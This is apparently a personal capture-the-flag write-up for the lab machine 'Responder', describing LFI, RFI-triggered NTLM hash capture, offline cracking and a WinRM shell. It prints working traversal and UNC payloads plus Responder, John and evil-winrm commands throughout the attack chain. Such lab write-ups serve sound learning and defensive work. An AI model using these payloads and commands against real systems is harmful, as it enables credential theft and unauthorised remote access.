# Responder 

**Protocol/Topic:** LFI → RFI → NTLM Hash Capture → Password Cracking → WinRM  
**Ports:** 80 (HTTP), 5985 (WinRM)  
**Date Solved:** 16 April 2025  
**Difficulty:** Easy

---

## What I Learned

This machine chains together several vulnerabilities and concepts. The steps are:

1. Find a file inclusion vulnerability in the web app
2. Use RFI to make the Windows machine connect back to you
3. Capture the NTLM hash with Responder
4. Crack the hash with John the Ripper
5. Use WinRM to get a shell on the machine

---

## Concepts

### DNS Resolution Issue

Sometimes accessing a site by IP gives an error because the app expects a domain name. Fix it by adding the mapping to your local hosts file:

```bash
# Edit hosts file
sudo nano /etc/hosts

# Add a line like:
<IP_addr.>    <domain_name>
```

Then access the site using the domain name in your browser instead of the IP.

### LFI (Local File Inclusion)

When a web app loads files based on a URL parameter without sanitizing it, you can traverse the file system using `../` sequences to read files that should be private.

Example:
```
http://unika.htb/?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

If the app loads that file and displays it, it's vulnerable to LFI.

### RFI (Remote File Inclusion)

A step further, instead of pointing to a local file, you point to a **resource on your own machine**. The vulnerable server then makes a network request back to you. On Windows, this often triggers an NTLM authentication attempt.

Example:
```
http://unika.htb/?page=//10.10.14.x/somefile
```

The `//` syntax is a UNC path. Windows will try to authenticate with the attacker's machine over SMB — sending its **NetNTLMv2 hash**.

### What is NTLM?

NTLM (New Technology LAN Manager) is a Windows authentication protocol. When a Windows machine tries to access a network resource, it sends a challenge-response hash instead of the plaintext password. That hash can be captured and cracked offline.

### Port 5985 — WinRM

WinRM (Windows Remote Management) runs on port 5985. Once you have valid credentials, it lets you get a remote shell on a Windows machine similar to SSH on Linux.

---

## The Full Attack Chain

### Step 1: Run Responder

Responder is a tool that listens on your network interface and captures NTLM hashes when machines try to authenticate to it.

```bash
# Start Responder on your VPN interface
sudo responder -I <network_interface (tun0)>

# Leave this running in the background
```

Check Responder's output to note your IP address (`tun0` IP).

### Step 2: Trigger the RFI

In the browser, use the page parameter to point to your machine:

```
http://unika.htb/?page=//<your-tun0-ip>/somefile
```

The target Windows machine will try to access that path and send its NTLM hash to your Responder listener.

### Step 3: Capture the Hash

Switch back to the Responder terminal. You should see something like:

```
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:...
```

Copy that entire hash and save it to a file:

```bash
echo "Administrator::RESPONDER:..." > hash.txt
```

### Step 4: Crack the Hash

Use John the Ripper with the `rockyou.txt` wordlist:

```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

If the password is in the wordlist, John will find it and print it.

### Step 5: Get a Shell with Evil-WinRM

```bash
# Connect to the target using the cracked credentials
sudo evil-winrm -u <username> -p <password> -i <target-ip>
```

Port 5985 is used here because that's the WinRM HTTP port. Once connected, you get a PowerShell shell on the Windows machine.

---

## Commands Reference

```bash
# Hosts file edit
sudo nano /etc/hosts

# Start Responder
sudo responder -I <network_interface>

# Crack hash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt <ur-file-name exp:hash.txt>

# WinRM shell
sudo evil-winrm -u <user> -p <password> -i <target-ip>
```

---

## Key Takeaway

This is what a real attack chain looks like, no single vulnerability gives you access, you chain them. LFI → RFI → hash capture → crack → shell. Each step opens the door for the next one. Responder is a powerful tool for capturing Windows auth hashes passively, and Evil-WinRM is a clean way to interact with Windows machines once you have creds.
